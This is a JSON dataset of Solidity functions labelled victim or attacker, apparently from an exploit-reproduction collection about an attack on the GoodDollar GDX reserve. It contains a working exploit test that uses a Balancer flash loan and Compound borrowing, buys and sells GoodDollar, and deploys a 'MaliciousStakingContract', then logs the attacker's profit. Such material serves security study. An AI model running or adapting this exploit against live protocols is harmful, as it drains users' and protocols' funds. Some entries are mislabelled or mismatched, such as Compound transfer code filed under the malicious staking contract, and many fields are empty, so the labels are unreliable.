[
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) external view returns (uint) {\n        bytes memory data = delegateToViewImplementation(abi.encodeWithSignature(\"allowance(address,address)\", owner, spender));\n        return abi.decode(data, (uint));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) external returns (bool) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"approve(address,uint256)\", spender, amount));\n        return abi.decode(data, (bool));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address owner) external view returns (uint) {\n        bytes memory data = delegateToViewImplementation(abi.encodeWithSignature(\"balanceOf(address)\", owner));\n        return abi.decode(data, (uint));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "buy",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "sell",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view returns (uint256) {\n        return totalSupplyAt(block.number);\n    }\n\n  ////////////////\n  // Query balance and totalSupply in History\n  ////////////////\n",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address dst, uint amount) external returns (bool) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"transfer(address,uint256)\", dst, amount));\n        return abi.decode(data, (bool));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", src, dst, amount));\n        return abi.decode(data, (bool));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IGDX",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] calldata tokens,\n        uint256[] calldata amounts,\n        uint256[] calldata feeAmounts,\n        bytes calldata userData\n    ) external {\n        // Obtain GoodDollar tokens\n        WrappedEther.withdraw(39_000 ether);\n        WrappedEther.approve(address(cETH), type(uint256).max);\n        cETH.mint{value: address(this).balance}();\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(cETH);\n        Comptroller.enterMarkets(cTokens);\n        uint256 underlyingAmount = cDAI.getCash();\n        cDAI.borrow(underlyingAmount);\n        DAI.approve(address(cDAI), type(uint256).max);\n        cDAI.mint(DAI.balanceOf(address(this)));\n        cDAI.approve(address(GDX), type(uint256).max);\n        uint256 goodDollarAmountToBuy = (cDAI.balanceOf(address(this)) * 19) / 20;\n        GDX.buy(goodDollarAmountToBuy, 1, address(this));\n\n        MaliciousStakingContract maliciousStakingContract = new MaliciousStakingContract();\n        // Transfer remaining cDAI amount to malicious staking contract.\n        // This will be used to buy GoodDollar for malicious staking contract when calling deposit()\n        cDAI.transfer(address(maliciousStakingContract), cDAI.balanceOf(address(this)));\n\n        for (uint256 i; i < 2; ++i) {\n            maliciousStakingContract.deposit();\n        }\n        maliciousStakingContract.transferTokens();\n\n        GoodDollarToken.approve(address(GDX), type(uint256).max);\n        // Following amount comes from original attack contract\n        // address 0xf06ab383528f51da67e2b2407327731770156ed6 -> parameter '_amount' in deposit()\n        uint256 amountToSell = 5_090_998_266_365;\n        // Burn GoodDollar amount\n        GDX.sell(amountToSell, 1, address(this), address(this));\n\n        cDAI.redeemUnderlying(underlyingAmount);\n        cDAI.repayBorrow(underlyingAmount);\n        // After repaying borrow withdraw DAI\n        cDAI.redeem(cDAI.balanceOf(address(this)));\n        // Withdraw ETH\n        cETH.redeem(cETH.balanceOf(address(this)));\n        WrappedEther.deposit{value: address(this).balance}();\n        // Before repaying Balancer there was transfer/donate of 123e15 amount of WETH from\n        // 0x6C08f56ff2B15dB7ddf2F123f5BFFB68e308161B - participant in the attack tx. Also this address holds final amounts of tokens\n        vm.prank(originalExploitContract);\n        WrappedEther.transferFrom(participant, address(this), 123e15);\n        WrappedEther.transfer(address(Balancer), amounts[0]);\n\n        emit log_named_decimal_uint(\"Exploiter DAI balance after attack\", DAI.balanceOf(address(this)), DAI.decimals());\n\n        emit log_named_decimal_uint(\n            \"Exploiter GoodDollarToken balance after attack\",\n            GoodDollarToken.balanceOf(address(this)),\n            GoodDollarToken.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_802_014);\n        vm.label(address(Balancer), \"Balancer\");\n        vm.label(address(WrappedEther), \"WrappedEther\");\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(GoodDollarToken), \"GoodDollarToken\");\n        vm.label(address(cETH), \"cETH\");\n        vm.label(address(cDAI), \"cDAI\");\n        vm.label(address(Comptroller), \"Comptroller\");\n        vm.label(address(GDX), \"GDX\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 0);\n        emit log_named_decimal_uint(\"Exploiter DAI balance before attack\", DAI.balanceOf(address(this)), DAI.decimals());\n\n        emit log_named_decimal_uint(\n            \"Exploiter GoodDollarToken balance before attack\",\n            GoodDollarToken.balanceOf(address(this)),\n            GoodDollarToken.decimals()\n        );\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WrappedEther);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = WrappedEther.balanceOf(address(Balancer));\n        Balancer.flashLoan(address(this), tokens, amounts, bytes(\"\"));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IGoodFundManager",
    "source_type": "victim_contract",
    "function_name": "collectInterest",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IcETH",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "    function borrow(uint borrowAmount) external returns (uint) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"borrow(uint256)\", borrowAmount));\n        return abi.decode(data, (uint));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IcETH",
    "source_type": "victim_contract",
    "function_name": "getCash",
    "original_code": "    function getCash() external view returns (uint) {\n        bytes memory data = delegateToViewImplementation(abi.encodeWithSignature(\"getCash()\"));\n        return abi.decode(data, (uint));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IcETH",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(uint mintAmount) external returns (uint) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"mint(uint256)\", mintAmount));\n        return abi.decode(data, (uint));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IcETH",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "    function redeem(uint redeemTokens) external returns (uint) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"redeem(uint256)\", redeemTokens));\n        return abi.decode(data, (uint));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IcETH",
    "source_type": "victim_contract",
    "function_name": "underlying",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MaliciousStakingContract",
    "source_type": "victim_contract",
    "function_name": "collectUBIInterest",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MaliciousStakingContract",
    "source_type": "victim_contract",
    "function_name": "transferTokens",
    "original_code": "    function transferTokens(address spender, address src, address dst, uint tokens) internal returns (uint) {\n        /* Fail if transfer not allowed */\n        uint allowed = comptroller.transferAllowed(address(this), src, dst, tokens);\n        if (allowed != 0) {\n            return failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.TRANSFER_COMPTROLLER_REJECTION, allowed);\n        }\n\n        /* Do not allow self-transfers */\n        if (src == dst) {\n            return fail(Error.BAD_INPUT, FailureInfo.TRANSFER_NOT_ALLOWED);\n        }\n\n        /* Get the allowance, infinite for the account owner */\n        uint startingAllowance = 0;\n        if (spender == src) {\n            startingAllowance = uint(-1);\n        } else {\n            startingAllowance = transferAllowances[src][spender];\n        }\n\n        /* Do the calculations, checking for {under,over}flow */\n        MathError mathErr;\n        uint allowanceNew;\n        uint srcTokensNew;\n        uint dstTokensNew;\n\n        (mathErr, allowanceNew) = subUInt(startingAllowance, tokens);\n        if (mathErr != MathError.NO_ERROR) {\n            return fail(Error.MATH_ERROR, FailureInfo.TRANSFER_NOT_ALLOWED);\n        }\n\n        (mathErr, srcTokensNew) = subUInt(accountTokens[src], tokens);\n        if (mathErr != MathError.NO_ERROR) {\n            return fail(Error.MATH_ERROR, FailureInfo.TRANSFER_NOT_ENOUGH);\n        }\n\n        (mathErr, dstTokensNew) = addUInt(accountTokens[dst], tokens);\n        if (mathErr != MathError.NO_ERROR) {\n            return fail(Error.MATH_ERROR, FailureInfo.TRANSFER_TOO_MUCH);\n        }\n\n        /////////////////////////\n        // EFFECTS & INTERACTIONS\n        // (No safe failures beyond this point)\n\n        accountTokens[src] = srcTokensNew;\n        accountTokens[dst] = dstTokensNew;\n\n        /* Eat some of the allowance (if necessary) */\n        if (startingAllowance != uint(-1)) {\n            transferAllowances[src][spender] = allowanceNew;\n        }\n\n        /* We emit a Transfer event */\n        emit Transfer(src, dst, tokens);\n\n        /* We call the defense hook (which checks for under-collateralization) */\n        comptroller.transferVerify(address(this), src, dst, tokens);\n\n        return uint(Error.NO_ERROR);\n    }\n\n",
    "description": ""
  }
]